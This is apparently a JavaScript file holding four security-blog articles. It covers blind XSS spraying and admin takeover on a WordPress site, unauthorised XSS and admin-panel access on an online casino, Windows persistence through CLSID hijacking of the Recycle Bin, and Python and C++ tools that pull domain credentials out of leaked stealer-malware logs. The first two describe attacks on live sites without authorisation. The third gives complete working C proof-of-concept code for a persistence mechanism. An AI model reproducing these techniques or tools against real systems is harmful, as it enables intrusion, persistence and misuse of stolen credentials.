// Sample article data - Replace with your actual articles
const articles = {
    1: {
        title: "WordPress Recon & Blind XSS to Admin Dashboard Access",
        date: "2024-03-20",
        category: "Web Security",
        content: `
            <h2>Reconnaissance</h2>
            <p>Using Wappalyzer, I discovered that the site runs on WordPress. Whenever I see WordPress, my first step is to run WPScan.</p>
            
            <h3>WPScan Command:</h3>
            <pre><code>wpscan --url https://targetsite.com</code></pre>
            
            <p>The target was using outdated versions of WordPress and plugins, one of which was an admin dashboard vulnerable to blind XSS.</p>
            
            <h2>Potential Attack Scenarios</h2>
            <p>I listed several attack scenarios to gain free access to paid content:</p>
            <ul>
                <li>Account takeover on paid accounts</li>
                <li>CSRF on critical forms (email, password)</li>
                <li>XSS leading to account takeover</li>
                <li>Accessing the admin dashboard</li>
                <li>Fuzzing endpoints</li>
                <li>Information disclosure</li>
                <li>Spraying blind XSS payloads</li>
            </ul>
            
            <h2>Account Takeover on Paid Accounts</h2>
            <h3>1. CSRF</h3>
            <p>The site lacked CSRF protection, meaning I could potentially change a victim's email or password. However, this required user interaction, such as clicking a malicious link, so I moved on to other methods.</p>
            
            <h2>Accessing the Admin Dashboard</h2>
            <h3>1. Fuzzing Endpoints</h3>
            <p>My primary tool is Burp Suite's Turbo Intruder, but in this case, WPScan revealed an accessible listing of the uploads folder. Unfortunately, it only contained PDFs, images, and icons — nothing useful.</p>
            
            <h3>2. Spraying Blind XSS</h3>
            <p>I generally avoid spraying payloads, but seeing the outdated WordPress version and plugins, and the target didn't have a bug bounty program, I knew there is low-hanging vulnerabilities like XSS. I started injecting blind XSS payloads using xss.report on every form I see (e.g., username, first and last name, email, password, user agent).</p>
            
            <p>Just before testing other attacks, an admin logged into the dashboard, and the XSS payload I had inserted in the username field executed. I received a notification in my email, confirming the execution.</p>
            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*fQuxXC_0rsMKmhoSAfPbZQ.png" alt="XSS Payload Execution">
            <h2>Results</h2>
            <p>I gained access to the admin dashboard, which allowed me to access data on 60,000 members, including courses, mentorships, and videos.</p>
            <p>Thankfully after sending a report via they're email, the team was nice and active and patched them quickly.</p>
        `
    },
    2: {
        title: "How I Hacked an Online Casino Without a Bug Bounty Program",
        date: "2024-03-15",
        category: "Web Security",
        content: `
            <h2>Introduction</h2>
            <p>About a year ago, I found an online casino, (let's call it hackedcasino.com). After gambling with fake money for an hour, I got bored and decided to hack it. Even though they didn't have a bug bounty program, it made a great story.</p>
            
            <h2>Reconnaissance</h2>
            <p>I started by gathering subdomains of the website</p>
            <pre><code>subfinder -d hackedcasino.com -all | httpx -sc -td -location</code></pre>
            
            <p>I found 22 subdomains and used Aquatone to quickly screenshot them. Most were affiliates, investors, or admin panels requiring authentication nothing interesting. But lp.hackedcasino.com, returned a 404 page which caught my attention.</p>
            <img src="https://miro.medium.com/v2/resize:fit:640/format:webp/1*uQHTY-sJowXCSkLp5dOHAw.png" alt="404 Page">
            <p>The site didn't load any custom js so i decided to fuzz it for endpoints</p>
            <pre><code>ffuf -w custom.wlist -u https://lp.hackedcasino.com/FUZZ -ac -recursion -c</code></pre>
            
            <h2>Account Takeover</h2>
            <h3>1 — Admin Dashboard</h3>
            <p>There was exposed admin panel with no authentication on endpoint lp.hackedcasino.com/admin</p>
            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*PdFKRUDUeq8cnm2sxF2HEw.png" alt="Admin Dashboard">
            <p>The purpose of the dashboard is for admins to create an affiliate landing pages. When someone (like TestAffiliate) wants to join, they contact the admins, who then go to lp.hackedcasino.com/admin to create a landing page like www.hackedcasino.com/TestAffiliate.</p>
            
            <p>With access to this dashboard, we can do administrative actions, such as editing, deleting, and duplicating.</p>
            
            <h3>2 — XSS</h3>
            <p>I tried creating a new landing page, then i discovered an input i that seemed vulnerable to XSS, i decided to test it</p>
            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*XaecsIiidFw2n8ejg2d1WQ.png" alt="XSS">
            <p>Creating a new affiliate landing page with javascript</p>
            <p>Visiting our newely created landing page, shows that our XSS ran successfuly, meaning we can run javascript on behalf of authenticated users visiting our landing page and extract they're cookies</p>
            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*TiQv2Dk3W8GKUKiRcP_Ycw.jpeg" alt="XSS">
            <p>I tried editing the affiliate landing page i created and noticed each one had a numeric value, like affid=819, affid=820, affid=821. My first thought was to edit each landing page (1, 2, 3, 4… 821) to make it run custom JavaScript upon load to steal cookies. However, modifying all 821 landing pages could break some, so I stopped and decided to report it instead.</p>
            
            <p>I got no response from the company, but fortunately, it looks like they've now implemented authentication.</p>
            <img src="https://miro.medium.com/v2/resize:fit:640/format:webp/1*QTlUlNMGB3sOIJMjJtJWsw.png" alt="XSS">
            <p>I also got RCE using file upload combined with path traversal, and i could of manipulated/deleted all games on the website, but thats a story for another day.</p>
            
            <h2>Conclusion</h2>
            <ul>
                <li>Always Fuzz 404 pages</li>
                <li>Always dig deeper, if an admin dashboard is exposed, it means no other reasercher found it, so intresting bugs will be there</li>
            </ul>
        `
    },
    3: {
        title: "Windows Persistence: CLSID Hijacking",
        date: "2024-03-25",
        category: "Windows Security",
        content: `
            <h2>Introduction</h2>
            <p>The Class ID, or CLSID, is a globally unique identifier that identifies a Windows COM class object. It allows operating systems and software to detect and access COM objects without identifying them by name. A typical CLSID in the registry looks like {645FF040-5081-101B-9F08-00AA002F954E}.</p>
            
            <p>Entries for the CLSID are present in HKEY_CLASSES_ROOT(HKCR). Values in HKCR is a merged view from both HKCU (HKEY_CURRENT_USER) and HKLM (HKEY_LOCAL_MACHINE). Because of this the majority of HKCR is read-only. However some keys allow a non-elevated user to both read and write.</p>
            
            <p>The registry hive contains keys and subkeys that can be used to change HKCR settings for file extensions to introduce a malicious proxy executable that can launch the appropriate file. Fortunately the use of CLSID's and it's functionality is well documented by Microsoft. This can give a better insight into what they're, how they operate and various vulnerabilities which may be present by hijacking them and being used by malware authors. We would be focusing on the "Shell" subkey in regard to CLSID associated with Recycle Bin.</p>
            
            <h2>Don't understand?</h2>
            <p>Our approach to this persistence method would be simple. We would open a handle to registry key "HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell" and create a subkey "open\\command".</p>
            
            <p>When we create the subkey the path the target registry path would look as follows:</p>
            <img src="1.JPG" alt="Registry Path">
            
            <p>Now we'll modify the command and set it's value to point to "Calc.exe or cmd.exe" or our malicious application. 'notapad.exe' in my case</p>
            <img src="2.JPG" alt="Command Modification">
            
            <p>The result of this code will be when the user opens the Recycle Bin, it'll execute the malicious application</p>
            
            <h2>Spoiler: POC Code</h2>
            <pre><code>#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;

#define WCHAR_MAXPATH (MAX_PATH * sizeof(WCHAR))

DWORD P0x4(VOID);

int main(VOID)
{
    DWORD dwReturn = ERROR_SUCCESS;
    dwReturn = P0x4();

    if (dwReturn != ERROR_SUCCESS)
    {
        return dwReturn;
    }

    return ERROR_SUCCESS;
}

DWORD P0x4(VOID)
{
    HKEY  hKey = HKEY_CLASSES_ROOT;
    WCHAR lpSubKey[WCHAR_MAXPATH] = L"CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\\command";
    WCHAR lpData[WCHAR_MAXPATH] = L"CALC.EXE";
    HKEY  phkResult = NULL;
    HKEY  hkResult;
    DWORD dispositions;

    if (RegCreateKeyEx(hKey, lpSubKey, 0, NULL,
        REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkResult, &dispositions) != ERROR_SUCCESS)
    {
        goto EXIT_ROUTINE;
    }

    if (RegOpenKeyEx(hKey, lpSubKey, 0, KEY_ALL_ACCESS, &phkResult) != ERROR_SUCCESS)
    {
        goto EXIT_ROUTINE;
    }

    if (RegSetValueEx(phkResult, NULL, 0, REG_SZ, (PBYTE)lpData, sizeof(lpData)) != ERROR_SUCCESS)
    {
        goto EXIT_ROUTINE;
    }

    if (phkResult)
    {
        RegCloseKey(phkResult);
    }

    if (hkResult)
    {
        RegCloseKey(hkResult);
    }
       
    return ERROR_SUCCESS;

EXIT_ROUTINE:

    DWORD dwError = GetLastError();

    if (phkResult)
    {
        RegCloseKey(phkResult);
    }

    if (hkResult)
    {
        RegCloseKey(hkResult);
    }

    return dwError;
}</code></pre>
        `
    },
    4: {
        title: "A stealer parsing tool in Python and C++ for bug bounty",
        date: "2023-01-28",
        category: "Web security",
        content: `
            <p>sometimes hackers publish stealer malware logs on the darknet for anyone to abuse, in these logs we can find credentials of bug bounty programs and report it to them.</p>
            
            <h2>Python (Slow)</h2>
            
            <pre><code>
import os
import time
import re

domains = ["domain.com"]
source_directory = r"C:\Users\Gadr\Desktop\Script\Logs"
destination_directory = r"C:\Users\Gadr\Desktop\Script\des"
count = {}

files_to_search = ["Passwords.txt", "_AllPasswords_list.txt", "passwords.txt"]

for root, dirs, files in os.walk(source_directory):
    for file_name in files_to_search:
        if file_name in files:
            source_file = os.path.join(root, file_name)
            # Get the file's last modified date
            file_time = os.path.getmtime(source_file)
            # Convert the timestamp to a readable format
            readable_time = time.ctime(file_time)
            # Remove invalid characters from the readable_time variable
            cleaned_time = re.sub(r"[/:]", "", readable_time)
            with open(source_file, encoding = 'utf-8') as f:
                lines = f.readlines()
                i = 0
                while i < len(lines):
                    for domain in domains:
                        if domain in lines[i]:
                            if domain not in count:
                                count[domain] = 0
                                if not os.path.exists(os.path.join(destination_directory, domain)):
                                    os.makedirs(os.path.join(destination_directory, domain))
                            parent_dir = os.path.basename(root)
                            destination_file = os.path.join(destination_directory, domain, f"{cleaned_time}.txt")
                            with open(destination_file, "a", encoding='utf-8', errors='ignore') as out_file:
                                out_file.write(lines[i])
                                out_file.write(lines[i+1])
                                out_file.write(lines[i+2])
                                out_file.write(lines[i+3])
                                out_file.write('\n')
                                count[domain] += 1
                    i += 1

for domain in domains:
    try:
        print(f"{count[domain]} of '{domain}' accounts found")
    except KeyError:
        print(f"No '{domain}' have been found.")</code></pre>

            <h2>C++ (Fast)</h2>
            
            <pre><code>
#include &lt;iostream&gt;
#include &lt;fstream&gt;
#include &lt;unordered_map&gt;
#include &lt;filesystem&gt;
#include &lt;regex&gt;
#include &lt;system_error&gt;
#include &lt;future&gt;
#include &lt;thread&gt;
#include &lt;vector&gt;

using namespace std;
namespace fs = filesystem;

bool VerboseEnabled = false;

void processLogsAsync(const vector<string>& keywords, const string& sourceDirectory, 
                     const string& destinationDirectory, promise<void>&& promise) {
    unordered_map<string, ofstream> keywordFiles;
    unordered_map<string, int> keywordCount;

    fs::create_directories(destinationDirectory);

    for (const auto& keyword : keywords) {
        string existingFile = destinationDirectory + "/" + keyword + ".txt";
        if (fs::exists(existingFile)) {
            fs::remove(existingFile);
        }
    }

    error_code ec;
    for (auto it = fs::recursive_directory_iterator(sourceDirectory, ec); 
         it != fs::recursive_directory_iterator(); it.increment(ec)) {
        if (ec) {
            if (VerboseEnabled) cerr << "Error" << ": " << ec.message() << "\n";
            ec.clear();
            continue;
        }

        const auto& entry = *it;

        if (entry.is_regular_file() && entry.path().extension() == ".txt") {
            string filename = entry.path().filename().string();
            regex pattern("password", regex_constants::icase);

            if (regex_search(filename, pattern)) {
                ifstream file(entry.path(), ios::binary);
                if (!file) {
                    if (VerboseEnabled) cerr << "Error opening file " << entry.path() << "\n";
                    continue;
                }

                string line;
                while (getline(file, line)) {
                    for (const auto& keyword : keywords) {
                        if (line.find(keyword) != string::npos) {
                            if (keywordFiles.find(keyword) == keywordFiles.end()) {
                                string outputFile = destinationDirectory + "/" + keyword + ".txt";
                                keywordFiles[keyword] = ofstream(outputFile, ios::app);
                                keywordCount[keyword] = 0;
                            }
                            keywordFiles[keyword] << line << endl;
                            keywordCount[keyword]++;
                            for (int i = 0; i < 2 && getline(file, line); ++i) {
                                keywordFiles[keyword] << line << endl;
                            }
                            keywordFiles[keyword] << endl;
                        }
                    }
                }
            }
        }
    }

    for (auto& [keyword, file] : keywordFiles) {
        file.close();
    }

    for (const auto& pair : keywords) {
        if (keywordCount.find(pair) != keywordCount.end()) {
            cout << "Found " << keywordCount[pair] << " credentials for " << pair 
                 << " in " << destinationDirectory << "/" << pair << ".txt" << endl;
        } else {
            cout << "No credentials found for " << pair << endl;
        }
    }

    promise.set_value();
}

void processLogs(const vector<string>& keywords, const string& sourceDirectory, 
                const string& destinationDirectory) {
    const unsigned int numThreads = thread::hardware_concurrency();
    vector<future<void>> futures;

    // Split the keywords into smaller chunks for multithreading
    const size_t chunkSize = (keywords.size() + numThreads - 1) / numThreads;
    for (size_t i = 0; i < keywords.size(); i += chunkSize) {
        const size_t end = min(i + chunkSize, keywords.size());
        vector<string> chunk(keywords.begin() + i, keywords.begin() + end);

        promise<void> promise;
        future<void> future = promise.get_future();
        futures.push_back(move(future));

        thread thread(processLogsAsync, chunk, sourceDirectory, destinationDirectory, move(promise));
        thread.detach();
    }

    // Wait for all threads to finish
    for (auto& future : futures) {
        future.get();
    }
}

// Function to split keywords arguments (netflix.com,paypal.com)
vector<string> split(const string& s, char delimiter) {
    vector<string> tokens;
    string token;
    istringstream tokenStream(s);
    while (getline(tokenStream, token, delimiter)) {
        tokens.push_back(token);
    }
    return tokens;
}

int main(int argc, char* argv[]) {
    if (argc < 2 || string(argv[1]) == "-h" || string(argv[1]) == "--help") {
        cout << "Usage: " << argv[0] << " -k \"netflix.com,paypal.com\" -l Logs -o Results" << endl;
        cout << "  -h, --help              Display this help message." << endl;
        cout << "  -k <Keywords>           Comma-separated list of keywords to search for." << endl;
        cout << "  -l <Logs>               Directory containing logs files." << endl;
        cout << "  -o <destination>        (Optional) Directory to store search results. Default: 'Results'" << endl;
        cout << "  -v <verbose>            (Optional) Turn on verbose If set." << endl;
        cout << endl;
        return 1;
    }

    vector<string> keywords;
    string sourceDirectory;
    string destinationDirectory;
    for (int i = 1; i < argc; ++i) {
        string arg(argv[i]);

        if (arg == "-k") {
            if (i + 1 < argc) {
                keywords = split(argv[++i], ',');
            } else {
                cerr << "Error: Missing keywords after -k flag." << endl;
                return 1;
            }
        }
        else if (arg == "-l") {
            if (i + 1 < argc) {
                sourceDirectory = argv[++i];
            } else {
                cerr << "Error: Missing source directory after -l flag." << endl;
                return 1;
            }
        }
        else if (arg == "-o") {
            if (i + 1 < argc) {
                destinationDirectory = argv[++i];
            } else {
                cerr << "Error: Missing destination directory after -o flag." << endl;
                return 1;
            }
        }
        else if (arg == "-v") {
            cout << "Verbose Mode Enabled" << endl;
            bool* verbosePtr = &VerboseEnabled;
            *verbosePtr = true;
        }
        else {
            cerr << "Error: Unknown argument: " << arg << endl;
            return 1;
        }
    }

    if (destinationDirectory.empty()) {
        destinationDirectory = "Results";
    }

    processLogs(keywords, sourceDirectory, destinationDirectory);

    return 0;
}</code></pre>

        `
    }
};

function loadArticle() {
    const urlParams = new URLSearchParams(window.location.search);
    const articleId = urlParams.get('id');
    
    const article = articles[articleId];
    
    if (article) {
        document.title = article.title;
        document.getElementById('article-title').textContent = article.title;
        document.getElementById('article-date').textContent = article.date;
        document.getElementById('article-category').textContent = article.category;
        document.getElementById('article-content').innerHTML = article.content;
    } else {
        document.getElementById('article-content').innerHTML = '<p>Article not found</p>';
    }
}

// Load article when the page loads
document.addEventListener('DOMContentLoaded', loadArticle); 
